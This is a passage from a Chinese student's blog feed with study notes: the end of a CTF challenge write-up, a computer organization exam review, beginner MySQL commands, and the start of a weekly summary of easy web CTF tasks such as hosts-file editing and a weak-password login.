loading="lazy"><br>第三个：解一个一元一次方程组<br>可以使用python写简单的几行代码，使用sqrt函数开方一下。<br>还可以在线网站解：<a href="http://www.99cankao.com/algebra/quadratic-equation.php">传送门</a><br><img src="https://img-blog.csdnimg.cn/20200511234845969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200511233855961.png" alt="j4y" loading="lazy"><br>然后发现程序直接关闭了，还是没有看到flag<br>所以就打开cmd，到目标目录下，运行<code>boom.exe</code>，将答案再填写一遍。<br><img src="https://img-blog.csdnimg.cn/20200511234237925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>得到flag。</p><p>参考链接：<br>我的不全，只有几道题。学长整理的比较多——ISCCweb题解：<a href="https://blog.csdn.net/qq_43431158/article/details/106160356">Lemon</a></p><p>文末寄语：</p><blockquote><p>没人能挽留你在这个世界，就像没人能阻止你来到这个世界。如果非要说害怕什么，我只是害怕上帝丢给我太多理想，却忘了给我完成理想的时间。<br>——《站在两个世界的边缘》</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理期末复习(基础)</title>
      <link href="/posts/f010de94/"/>
      <url>/posts/f010de94/</url>
      
        <content type="html"><![CDATA[<p>前言：快要期末考试了，划水整学期的我说不慌那是假的，本学期非常有纪念意义，在家度过整个学期。废话不多说啦，肝！开始复习！<br><img src="https://img-blog.csdnimg.cn/20200520224244171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h1 id="冯诺依曼计算机特点"><a href="#冯诺依曼计算机特点" class="headerlink" title="冯诺依曼计算机特点"></a>冯诺依曼计算机特点</h1><p>1.计算机由运算器、存储器、控制器、输入输出设备五大部件组成<br>2.指令和数据以同等地位存放于存储器内，并可按地址寻访。<br>3.指令和数据均用二进制数表示。<br>4.指令由操作码和地址码组成。操作码用来表示操作的性质，地址码用来表示操作数在存储器中的位置。<br>5.指令在存储器内按顺序存放。通常，指令是按顺序执行的，在特定条件下，可根据运算结果或根据设定的条件改变执行顺序。<br>6.机器以运算器为中心，输入输出设备与存储器间的数据传递通过运算器完成。<br><img src="https://img-blog.csdnimg.cn/20200520224747990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>各部件的功能：<br>运算器：用来完成算数运算和逻辑运算，并将运算的中间结果暂存在运算器内。<br>存储器：用来存放数据和程序 。<br>控制器：用来控制、指挥程序和数据的输入、运行以及处理运算结果。<br>输入设备：用来将人们熟悉的信息形式转换为机器能识别的信息形式，常见的有键盘、鼠标等。<br>输出设备：可将机器运算结果转换为人们熟悉的信息形式，如打印机输出，显示器输出等。<br><img src="https://img-blog.csdnimg.cn/20200520224835230.png" alt="j4y" loading="lazy"><br>主存储器是存储器子系统中的一类用来存放程序和数据，可以直接与CPU交换信息。另一类称为辅助存储器，简称辅存，又称外存。<br>算术逻辑单元（ALU）简称算辑部件，用来完成算术逻辑运算。控制单元（CU）用来用来解释存储器的指令，并发出各种操作命令来执行指令。ALU和CU是CPU 的核心部件。<br>I/O设备也受CU控制、用来完成相应的输入、输出操作。</p><p>计算机的工作过程：<br><img src="https://img-blog.csdnimg.cn/20200520224911184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>（1）主存储器：简称主存或内存。包括存储体M、各种逻辑部件及控制电路等。存储体有许多存储的单元组成，每个存储单元又包含若干个存储元件（或称存储基元、存储元。）寄存器：为了能实现按地址访问的方式，主存中还必须配置两个寄存器MAR和MDR。MAR是存储器地址寄存器，用来存放域访问的存储的单元的地址，其位数对应存储单元的个数，（如MAR为10位，则有 ）MDR是存储器数据寄存器，用来存放从存储体某单元取出的代码或者准备往某存储单元存入的代码，其位数与存储字长相等<br>（2）运算器：运算器最少包括3个寄存器和一个算术逻辑单元（ALU）其中ACC为累加器MQ为乘商寄存器，X为操作数寄存器，这3个寄存器在完成不同运算时，所存放的操作数 类别也各不相同。<br><img src="https://img-blog.csdnimg.cn/20200520224948243.png" alt="j4y" loading="lazy"><br>M表示存储器的任意地址号，[M]表示对应M地址号单元中的内容；X表示X寄存器，[X]表示X寄存器中的内容；ACC表示累加器，[ACC]表示累加器中的内容；MQ表示乘商寄存器，[MQ]表示乘商寄存器中的内容。</p><h1 id="简答题型"><a href="#简答题型" class="headerlink" title="简答题型"></a>简答题型</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这些简答题是我在学习过这位博主小姐姐的文章后做得笔记。原文传送门——<a href="https://blog.csdn.net/qq_41587612/article/details/96769076">计算机组成原理超实用</a><br>简答题：</p><ol><li>影响流水线性能的主要因素有哪几种？请简要加以说明。<pre><code> 结构相关：是当多条指令进入流水线后，硬件资源满足不了指令重叠执行的要求时产生的，不同指令争用同一功能部件产生资源冲突。 数据相关：是指令在流水线中重叠执行时，当后继指令需要用到前面指令的执行结果时发生的。可能改变对操作数的读写访问顺序。 控制相关：是当流水线遇到分支指令和其他改变PC值的指令时引起的。</code></pre></li><li>为了保证DRAM(动态随机存储器)的存储信息不遭破坏，必须在电荷漏掉前就进行充电，称为刷新。常见的刷新方式有哪三种，试分析它们间的区别。<pre><code> 集中刷新：是在规定的一个刷新周期内，对全部存储单元集中一段时间逐行(hang)进行刷新，此刻必须停止读/写操作。 分散刷新：是指对每行存储单元的刷新分散到每个存储周期内完成。 异步刷新：是前两种方式的结合，既可缩短“死时间”，又充分利用最大刷新间隔2ms的特点。</code></pre></li><li>说明计算机九大寻址方式及有效地址EA计算方法。<pre><code> 立即寻址：无需寻址        隐含寻址：无需寻址       直接寻址：EA=A        间接寻址：EA=(A)         相对寻址：EA=(PC)+A 基址寻址：EA=(BR)+A    变址寻址：EA=(IX)+A    寄存器寻址：EA=Rj    寄存器间接寻址：EA=(Rj)</code></pre></li><li>按传输信息的不同，系统总线可分为哪几类？并加以简单描述。<pre><code> 数据总线：用来传输各种功能部件间的数据信息，是双向传输总线，其位数与机器字长、存储字长有关，一般为8/16/32位。 地址总线：主要用来指出数据总线上的源数据或目的数据在主存单元的地址或I/O设备的地址。 控制总线：用来发送各种控制信号的传输线，通常对任意控制线而言，它的传输是单向的。</code></pre></li><li>试说明具有Cache-主存结构的计算机，CPU在访问存储器时的工作流程。    <pre><code> CPU欲读取主存某字时，有两种可能：一种是所需要的字已经在缓存中，即可直接访问Cache；另一种是所需的字不在Cache内，此时需将该字所在的主存整个字块一次调入Cache中（Cache与主存之间是字块传输)。当Cache未满时，主存块可被调入缓存块中，称该主存块与缓存块建立了联系。当Cache已满时，无法接收来自主存块的信息，就由Cache内的替换机构按一定的算法从Cache内移除哪块返回主存，并把新的主存块调入Cache中。</code></pre></li><li>在写操作时，要考虑Cache和主存的数据一致性的问题，试说明写回法和写直达法的区别。    <pre><code> 写回法（拷回法）：写操作时只把数据写入Cache而不写入主存（减少了主存的写操作次数），写操作时间=访Cache时间。但当（读操作且Cache已满时）Cache数据被替换出来时才写回主存，增加了Cache复杂性。 写直达法（存直达法）：写操作时数据既写入Cache又写入主存，写操作时间=访存时间，它能随时保证主存与Cache的数据始终一致，但增加了访存次数。（读操作时不涉及对主存的写操作，更新策划较容易实现。）</code></pre></li><li>说明补码定点加减运算，判断溢出的两种方法。    <pre><code> 一位符号位判断溢出：参加操作的两个数（减法时即为被减数和“求补”后的减数）符号相同，其结果的符号与原操作数的符号不同，即为溢出。 两位符号位判断溢出：若结果双符号位相同，则未溢出；若双符号位不同，则溢出。最高符号位为真结果符号。</code></pre></li><li>说明Cache-主存的地址映像有哪三种方式，说明他们的基本映像原理。<pre><code> 直接映射：将主存空间按Cache的尺寸分区，每区内相同的块号映像到Cache中相同的块位置。优：实现简单；缺：不够灵活 全相连映射：主存中的每一个字块可映射到Cache任何一个字块位置上，当访问一个块中的数据时，块地址要与Cache块表中的所有地址标记进行比较以确认是否命中。 组相连映射：是直接映射和全相连映射的一种折中方案，这种方案将存储空间分为若干组，各组间是直接映射，而组内各块间是全相连映射。</code></pre></li><li>试说明指令周期，机器周期，时钟周期之间的关系。    <pre><code> 一个指令周期包含若干个机器周期，一个机器周期又包含若干个时钟周期（节拍），每个指令周期内的机器周期数可以不等，每个机器周期内的节拍数也可以不等。</code></pre></li><li>试说明单译码方式（线选法）和双译码方式（重合法）的区别。    <pre><code>存储芯片内的地址译码器有两种方式：一种是线选法，适用于地址线较少的芯片。地址信号只需经过一个方向的译码器就可以选中某一存储单元的所有位，结构较简单。另一种是重合法，适用于地址线较多的芯片。地址线分为两组，分别经行地址译码器和列地址译码器，通过两者“与”选中存储单元才能进行读/写。</code></pre></li><li>分别说明一下名词MAR，MDR，CU，IR，PC的中文名称及该器件的主要功能。<pre><code>MAR是存储器地址寄存器，用来存放欲访问的存储单元的地址，其位数对应存储单元的个数。MDR是存储器数据寄存器，用来存放从存储体某单元取出or存入的代码，其位数与存储字长相等。CU是控制单元，用来分析当前指令所需完成的操作，并发出各种微操作命令序列，用以控制所有被控对象。IR是指令寄存器，用来存放当前指令，IR的内容来自MDR。PC是程序计数器，用来存放当前欲执行指令的地址，它与主存的MAR间有一条直接通道且具有自动加1功能，即可自动形成下一条指令的地址。</code></pre></li><li>计算机的五大基本组成是什么？<pre><code>运算器：用来完成算术运算和逻辑运算，并将运算的中间结果暂存在运算器里。存储器：用来存放数据和程序。控制器：用来控制、指挥程序和数据的输入、运行以及处理运算的结果。输入设备：用来将人们熟悉的信息形式转换为机器能识别的信息形式，常见的有键盘、鼠标等。输出设备：可将机器运算结果转换为人们熟悉的信息形式，如打印机输出等。</code></pre></li><li>设某计算机采用微程序控制器，试说明微程序控制器的基本工作原理（即CPU执行指令时的操作过程）。<pre><code>首先将用户程序的首地址送到PC，然后进入取指阶段：        ①将取指周期微程序首地址M→CMAR        ②取微指令：将对应控存M地址单元中的第一条微指令读到控存数据寄存器中，记为`CM(CMAR)→CMDR`                        ③产生微操作指令：第一条微指令的操作控制字段中为“1”的各位发出控制信号，如PC→MAR、I→R，命令主存    接收程序首地址并进行读操作。        ④形成下一条微指令的地址：此微指令的顺序控制字段指出了下一条微指令的地址为M+1，将M+1送至CMAR，即`Ad(CMDR)→CMAR`        ⑤取下一条微指令：将对应控存M+1地址单元中的第二条微指令读到CMDR中，即`CM(CMAR)→CMDR`        ⑥产生微操作指令：由第二条微指令的操作控制字段中对应“1”的各位发出控制信号，如M(MAR)→MDR使对应主存2000H地址单元中的第一条机器指令从主存中读出，送至MDR中。        ⑦形成下一条微指令地址：将第二条微指令下地址字段指出的地址M+2送至CMAR，即`Ad(CMDR)→CMAR`执行阶段：        ①取数指令微程序首地址的形成：当取数指令存入IR后，其操作码OP(IR)直接送到微地址形成部件，该部件的输出即为取数指令微程序的首地址P，且将P送至CMAR，记作OP(IR)→微地址形成部件→CMAR        ②取微指令：将对应控存P地址单元中的微指令读到CMDR中，记为`CM(CMAR)→CMDR`        ③产生为操作命令：由微指令操作控制字段中对应“1”的各位发出控制信号，如Ad(IR)→MAR、I→R，命令主存读操作数。        ④形成下一条微指令地址：将此条微指令下地址字段指出的P+1送至CMAR，即`Ad(CMDR)→CMAR`</code></pre></li><li>试说明汉明码的校验原理（即如何生成汉明码，以及汉明码的检验原理），默认偶校验。<pre><code>汉明码的生成步骤：①确定校验位的位数 `2^k ≥ n + k +1`                  ②确定校验位的位置                  ③分组                  ④生成校验位的值                  ⑤得出结论检验原理：将已知的汉明码按照前三步正常进行，到第四步时，用H接收P和D一起异或，然后把H倒序排列，若都为0，即无错。否则，该序列对应的二进制位置出错。</code></pre></li><li>试说明循环冗余校验码的校验原理。<pre><code>循环冗余校验码的生成步骤：①确定校验位的位数 r                          ②写出信息多项式 `M(x)`                          ③将信息多项式左移 r 位，得到 `M(x)·x^r`                          ④用 `M(x)·x^r` 除以生成多项式 G(x)，得到 r 位校验位                          ⑤`M(x)·x^r+R(x)` 得到CRC码检验原理：根据余数判出错位，取反纠错。</code></pre><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2></li></ol><h1 id="计算题"><a href="#计算题" class="headerlink" title="计算题"></a>计算题</h1><p>先复习下正数和负数的原码、补码、反码怎么写。<br>正数的原码、补码和反码都是一样的。<br>比如：+7<br>数值 (原码)<code>0,0000111</code>最前面的是符号位，正数是0，负数是1<br>则+7的补码为<code>0,0000111</code>、反码为<code>0,0000111</code><br>负数  -7<br>数值(原码)<code>1,0000111</code>符号位是1<br>则-7的反码<code>1,1111000</code> （负数的反码与原码符号位相同，数值为取反）<br>补码<code>1,1111001</code> （负数的补码是在反码的基础上加1，）</p><h2 id="第一题移位运算"><a href="#第一题移位运算" class="headerlink" title="第一题移位运算"></a>第一题移位运算</h2><p><img src="https://img-blog.csdnimg.cn/20200520232958908.png" alt="j4y" loading="lazy"><br>拿+26做栗子;<br><img src="https://img-blog.csdnimg.cn/20200521000059661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>负数用-26当栗子：<br><img src="https://img-blog.csdnimg.cn/20200521001600328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h2 id="第二题加减运算"><a href="#第二题加减运算" class="headerlink" title="第二题加减运算"></a>第二题加减运算</h2><p>加减法问题，在计算机中的基本运算。<br>方法：</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">加法：A<span class="token operator">+</span>B=A<span class="token operator">+</span>B减法：A<span class="token operator">-</span>B=A<span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">-</span>B<span class="token punctuation">)</span></code></pre><p>而且进行加减时，都采用补码作为加减运算。<br><code>[A]补+[B]补=[A+B]补</code><br><code>[A]补+[-B]补=[A-B]补</code><br><img src="https://img-blog.csdnimg.cn/20200523183124714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>就是<code>1+1=0</code>的问题。<br>变形补码判断溢出<br>最高位的永远是符号位<br><img src="https://img-blog.csdnimg.cn/20200524065033156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>有些题会设机器数字长为8（连符号位）<br>这样的就是包括符号位一共是8位的。比如</p><pre class="language-bash" data-language="bash"><code class="language-bash">+45<span class="token operator">=</span>+0101101<span class="token punctuation">[</span>B<span class="token punctuation">]</span>补<span class="token operator">=</span><span class="token number">0,0101101</span><span class="token punctuation">[</span>-B<span class="token punctuation">]</span>补<span class="token operator">=</span><span class="token number">1,1010011</span></code></pre><p>记住一点，加法运算后的结果，符号位前面的该丢就丢。<br>分数怎么转换成计算机机器数字？<br>原理：分母是2的n次方，先将分子转换成二进制数字，然后将小数点向前移动n位。比如：<br><img src="https://img-blog.csdnimg.cn/2020052407010438.png" alt="j4y" loading="lazy"><br>2的4次方是16，所以先将分子11转换成二进制，是1011，小数点向前移动4位，就是<code>0.1011</code>符号是负号。所以是<code>-0.1011</code>，则它的补码就是<code>1,0101</code></p><h2 id="第三题型乘法运算"><a href="#第三题型乘法运算" class="headerlink" title="第三题型乘法运算"></a>第三题型乘法运算</h2><p>什么概念的课本上一堆，不想看。直接看例题来的快。<br><img src="https://img-blog.csdnimg.cn/20200524072710251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>看过之后，也是懵B，所以看下面这个。我把它的被乘数(也就是在计算的时候放在最上面的数。)和乘数换了个位置，就是原本是AxB,形式改成BxA数字变了一下。看下面的计算过程。<br><img src="https://img-blog.csdnimg.cn/20200524072542573.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>可能有的疑问：怎么判断移位移多少？<br>答：看乘数。比如上题中(手写的这个)乘数是<code>0.1101</code>，它转换回我们日常生活中的数字是这么转换的</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">1101</span><span class="token operator">=</span>1x2的三次方+1x2的二次方+0x2的一次方+1x2的零次方</code></pre><p>根据这个判断移位。<br>关于补码一位乘<br>参考链接<a href="https://blog.csdn.net/liuchuo/article/details/52921504">补码乘法一位乘</a><br>还有最上面的那个链接里也有讲解。<br>先到这里，慢慢消化，考试加油。<br>文末寄语：</p><blockquote><p>愿你被很多人爱，如果没有，愿你在寂寞中学会宽容。——刘瑜</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对数据库的浅显理解及MySQL的简单运用</title>
      <link href="/posts/d58378c3/"/>
      <url>/posts/d58378c3/</url>
      
        <content type="html"><![CDATA[<h2 id="初学阶段对数据库、mysql等知识的较浅程度的理解"><a href="#初学阶段对数据库、mysql等知识的较浅程度的理解" class="headerlink" title="初学阶段对数据库、mysql等知识的较浅程度的理解"></a>初学阶段对数据库、mysql等知识的较浅程度的理解</h2><p>近段时间了解了数据库等知识的概念以及MySQL的初步学习，以下就是我在学习过程中的一些收获，跟大家分享一下。</p><h2 id="数据库（DateBase-简称DS）"><a href="#数据库（DateBase-简称DS）" class="headerlink" title="数据库（DateBase,简称DS）"></a><em>数据库（DateBase,简称DS）</em></h2><p>数据是数据库中存储的基本对象。数据的种类有很多种，<strong>文本（Text）、图形(graph)、图像（lmage）、音频（Audio）、视频（Video）</strong>、各种档案记录等等。这都是属于数据的部分。</p><ol><li><p><strong>数据库</strong>，概念：数据库顾名思义就是存放数据的仓库。数据库的存放空间很大，可以存放上亿条数据，但是数据库不是随意的将数据储存进仓库的，它是有一定规则的，因为这样保证了查询数据时的效率，<strong>否则查询效率会非常低。</strong></p><h2 id="数据表（DateTable）"><a href="#数据表（DateTable）" class="headerlink" title="数据表（DateTable）"></a><strong><em>数据表（DateTable）</em></strong></h2><p>数据表是一个临<strong>时保存数据</strong>的<strong>网格虚拟表</strong>，它不需要代码就可以简单的绑定数据库。<br>当访问DateTable对象时，注意一点它们是区分大小写的。如果一个<strong>DateTable</strong>被命名时的名字<strong>大小写不同</strong>，那么它们就<strong>不是同一个数据表</strong>。<br>数据表使用前需要自己创建一个。</p><h2 id="字段（field）"><a href="#字段（field）" class="headerlink" title="字段（field）"></a><em>字段（field）</em></h2><p>在数据库中，大多数时，表的“列“称为”字段“，每个字段包含某一专题的信息。<br>有时候，字段也不代表数据表中的列。</p><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a><em>MySQL</em></h2><p>MySQL是一种关系型数据库管理系统，关系数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。该系统使用的语言是SQL语言。<br>（SQL语句结束，要在语句末尾加上一个分号“ ； ”来结尾。）</p><h3 id="mysql基本命令"><a href="#mysql基本命令" class="headerlink" title="mysql基本命令"></a><em>mysql基本命令</em></h3><h4 id="登录MySQL："><a href="#登录MySQL：" class="headerlink" title="登录MySQL："></a>登录MySQL：</h4><p>当我们打开在电脑上安装好的mysql，输入安装时本人设置的密码，会出现下图所示的界面，如果出现下面红框中的内容就表示你已经登录了mysql。<br><img src="https://img-blog.csdnimg.cn/20200111122643490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" loading="lazy"></p><h4 id="退出MySQL："><a href="#退出MySQL：" class="headerlink" title="退出MySQL："></a>退出MySQL：</h4><p>退出有两种方法<br>1.输入<strong>exit</strong>，然后就直接退出了。<br>2.同时按键盘上的<strong>ctrl+C</strong>也是可以直接退出的。</p><h5 id="1-查看当前所有的数据库"><a href="#1-查看当前所有的数据库" class="headerlink" title="1.查看当前所有的数据库"></a>1.查看当前所有的数据库</h5><p>show databases;<br>输入上面的sql命令，可以查询到当前的所有的数据库。如下图：<img src="https://img-blog.csdnimg.cn/20200111124735527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>上图说明有四个数据库。</p><h5 id="2-打开指定的库"><a href="#2-打开指定的库" class="headerlink" title="2.打开指定的库"></a>2.打开指定的库</h5><p>use 库名；（<strong>输入命令时，单词之间要加空格</strong>）</p><h5 id="3-查看当前库的所有表"><a href="#3-查看当前库的所有表" class="headerlink" title="3.查看当前库的所有表"></a>3.查看当前库的所有表</h5><p>show tables;下图为具体示例。（<strong>注意：查看数据表前，要先打开你想查看的数据库，否则就会出现查询不到信息现象。</strong>）<br><img src="https://img-blog.csdnimg.cn/20200111125342154.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h6 id="4-查询其他数据库的所有表"><a href="#4-查询其他数据库的所有表" class="headerlink" title="4.查询其他数据库的所有表"></a>4.查询其他数据库的所有表</h6><p>show tables from 库名；</p><h5 id="5-查看表结构"><a href="#5-查看表结构" class="headerlink" title="5.查看表结构"></a>5.查看表结构</h5><p>desc 表名；</p></li></ol><p><img src="https://img-blog.csdnimg.cn/20200111131803669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h5 id="6-查看表里的数据"><a href="#6-查看表里的数据" class="headerlink" title="6.查看表里的数据"></a>6.查看表里的数据</h5><p>select * from 表名；<br>输入此语句即可查看该表里的数据。</p><h5 id="7-增添-创建一个数据库"><a href="#7-增添-创建一个数据库" class="headerlink" title="7.增添/创建一个数据库"></a>7.增添/创建一个数据库</h5><p>create database test1；（库名）<br>这样就可以创建一个库名叫做test1的一个数据库，</p><h5 id="8-创建表"><a href="#8-创建表" class="headerlink" title="8.创建表"></a>8.创建表</h5><p>可一次性创建多个表：<br>create table 表名（列名，列类型）；<br>也可以单独创建一个表：<br>create table 表名 （<br>         列名 列类型，<br>         列名 列类型<br>         ………</p><p>)；<br><strong>注：创建一个表时，列类型后不用加“逗号”，创建多个表时，最后一个列表后不用加“逗号”。</strong></p><h5 id="9-向表中插入数据"><a href="#9-向表中插入数据" class="headerlink" title="9.向表中插入数据"></a>9.向表中插入数据</h5><p>insert into host values (‘001’,‘xiaobai’)；<br><img src="https://img-blog.csdnimg.cn/20200112143251660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>如图所示，这里我在一个表名为first_t1的表里插入了两组数据，然后我再次查询这个表中数据时就会出现我刚才插入的数据，如下图：<img src="https://img-blog.csdnimg.cn/2020011214455817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>以上就是我（**<em>初学小白**</em>）通过浅显的自学后所获得的知识，仅代表个人意见，如有些许错误，烦请各位牛人指正，我会尽快作出修改。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 数据库MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一周任务小总结</title>
      <link href="/posts/45871875/"/>
      <url>/posts/45871875/</url>
      
        <content type="html"><![CDATA[<p>前言：这周就开始有任务了，比起自己盲目的找东西学好了很多很多。</p><h3 id="（一）CTF题型练习"><a href="#（一）CTF题型练习" class="headerlink" title="（一）CTF题型练习"></a>（一）CTF题型练习</h3><h5 id="web"><a href="#web" class="headerlink" title="web"></a>web</h5><p>域名解析：<br><img src="https://img-blog.csdnimg.cn/20200322105621366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>域名解析听起来好像跟服务器有关的域名解析（前几天刚get一个十年的域名。嘿嘿）。<br>我分别打开这两个都看了一下<br><img src="https://img-blog.csdnimg.cn/20200322111749762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200322111808862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>事实证明白日做梦是不可取的。🥱🥱🥱<br><code>400 Bad Request</code>是什么意思，见过502,之类的没还么见过400呢，查一下了解到应该是请求参数错误，<a href="https://baike.baidu.com/item/400/814387?fr=aladdin">百度百科关于400</a>，解析域名，不通过服务器怎么玩？？我也不会，百度都是在服务器上解析的。去看下别的博主的博客，关于这道题的wp,知道怎么做了，<br>系统在进行dns解析之前，会优先按照hosts文件解析让改hosts的信息<br>操作一下，按照师傅们说的路径打开，<br><img src="https://img-blog.csdnimg.cn/20200322113255899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>添加一行<br><img src="https://img-blog.csdnimg.cn/20200322114452728.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>完成，我去访问下试试，<br><img src="https://img-blog.csdnimg.cn/20200322115411394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>why???我再用火狐试试<br><img src="https://img-blog.csdnimg.cn/20200322114906835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>我***why？？？我中毒了？？到哪都踩坑，我真是服了。坑就这么喜欢我？？？？<br>百度也没有发现有这种情况啊，我也让我同学帮着试了一下，也不行，现在想想估计不是我们的操作或者浏览器的问题。bugku有毒，我决定换地方。<br>不管了，我还找到了另一种方法<br>用burp抓包，然后改host头 的信息，具体操作 也没办法做，我也不知道能不能做出来，不过原理上来说是可行的。（也是一种思路）</p><h5 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h5><p><img src="https://img-blog.csdnimg.cn/20200322130910376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>进入之后看到登录框了我就先万能密码试一下<br><img src="https://img-blog.csdnimg.cn/20200322131054902.png" alt="Augenstern" loading="lazy"><br>提示账户名是admin。再试一下在密码框里加万能密码。有提示密码错误。那应该不是万能密码。看下源码f12。<br><img 